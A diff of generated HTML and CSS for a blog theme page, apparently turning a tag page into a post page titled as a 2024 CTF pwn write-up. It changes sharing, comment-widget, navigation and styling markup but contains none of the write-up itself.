+        			<a href="/categories/wp//" class="article-tag-list-link color3">wp</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
 
     
 
@@ -313,7 +470,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-     <!-- <img src="//pan.baidu.com/share/qrcode?url=http://example.com/tags/" alt="微信分享二维码"> -->
+     <!-- <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2024/11/06/2024%E5%BC%BA%E7%BD%91%E6%9D%AFpwn%E9%83%A8%E5%88%86wp/" alt="微信分享二维码"> -->
     </div>
 </div>
 
@@ -325,6 +482,16 @@
   </div>
 </article>
 
+
+<nav id="article-nav">
+  
+  
+    <a href="/2024/11/06/unlink/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">UNLINK</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
 
 
 <aside class="wrap-side-operation">
@@ -361,9 +528,9 @@
     <script src="/lib/gitment.js"></script>
   
   <script>
-    <!-- id: "tags" -->
+    <!-- id: "2024强网杯部分pwn" -->
     var gitment = new Gitment({
-      id: "20240711142001",
+      id: "20241106161816",
       owner: 'NEWYM',
       repo: '评论',
       oauth: {
@@ -378,6 +545,120 @@
   
 
 
+
+<style>
+    .ititle {
+        margin: 15px 0;
+        text-align:center;
+        font-family: 'Architects Daughter', cursive;
+    }
+    .ipage {
+        line-height: 30px;
+        margin: 0 auto;
+        padding: 15px 32px 29px;
+        background-color: #f9f9f9;
+        box-shadow: 0px 2px 5px 0px rgba(0, 0, 0, 0.26);
+        -moz-border-radius-bottomleft: 20px 500px;
+        -moz-border-radius-bottomright: 500px 30px;
+        -moz-border-radius-topright: 5px 100px;	
+        -webkit-border-bottom-left-radius: 20px 500px;
+        -webkit-border-bottom-right-radius: 64px 10px;
+        -webkit-border-top-right-radius: 5px 100px;    
+        border-bottom-left-radius: 20px 500px;
+        border-bottom-right-radius: 64px 10px;
+        border-top-right-radius: 5px 100px;           
+        -webkit-background-size: 100% 30px;
+        -moz-box-shadow: 0 2px 10px 1px rgba(0, 0, 0, 0.2);
+        -webkit-box-shadow: 0 2px 10px 1px rgba(0, 0, 0, 0.2);
+        text-shadow: 0 1px 0 #F6EF97;
+        position: relative;
+    }
+.izhengwen {
+    position: relative;
+    top: 0;
+    left: 0;
+    z-index: 2;
+    height: auto;
+    background: repeating-linear-gradient(to bottom, #f9f9f9, #f9f9f9 31px, #6BA2D8 1px, #f9f9f9);
+    background-size: 100% 32px;
+}
+#articleContent p {
+    margin: 0
+}
+.ititle {
+    font-family: 'Architects Daughter', cursive;
+    font-size: 1.45rem!important;
+    padding: 10px auto;
+}
+.izhengwen p {
+    position: relative;
+    line-height: 2.2rem!important;
+    text-indent: 2em;
+    font-family: 'Architects Daughter', cursive!important;
+    font-size: 1.45rem!important;
+}
+.ipage::before {
+    content: " ";
+    display: inline-block;
+    position: absolute;
+    top: 0px;
+    bottom: 0;
+    right: 52px;
+    z-index: 4;
+    width: 4px;
+    height: 100%;
+    border-left: 1px solid #fca1a1;
+}
+.izhengwen p:nth-child(odd):before {
+    content: " ";
+    display: inline-block;
+    position: absolute;
+    top: 0;
+    left: -16px;
+    z-index: 3;
+    width: 24px;
+    height: 24px;
+    background-color: #fff;
+    -webkit-border-radius: 50%;
+    -moz-border-radius: 50%;
+    border-radius: 50%;
+    box-shadow: inset 0px 2px 5px 0px rgba(0, 0, 0, 0.26);
+}
+.ipage:after {
+    content: " ";
+    display: inline-block;
+    position: absolute;
+    top: 0;
+    bottom: 0;
+    left: 52px;
+    z-index: 3;
+    width: 4px;
+    height: 100%;
+    border-left: 4px double #fca1a1;
+}
+.ipage p {
+    padding: 0 2em;
+    color: #333!important;
+}
+body.dark .ipage {
+    opacity: 0.85;
+}
+/*小屏幕下(手机类)的样式*/
+@media only screen and (max-width: 600px) {
+    .ipage {
+        padding: 15px 23px 29px;
+    }
+    .ipage:after {
+        left: 36px;
+    }
+    .ipage::before {
+        right: 36px;    
+    }
+    .ipage p {
+        padding: 0 0.9em;
+    }
+}
+</style>
 
           </div>
         </div>
@@ -417,7 +698,7 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
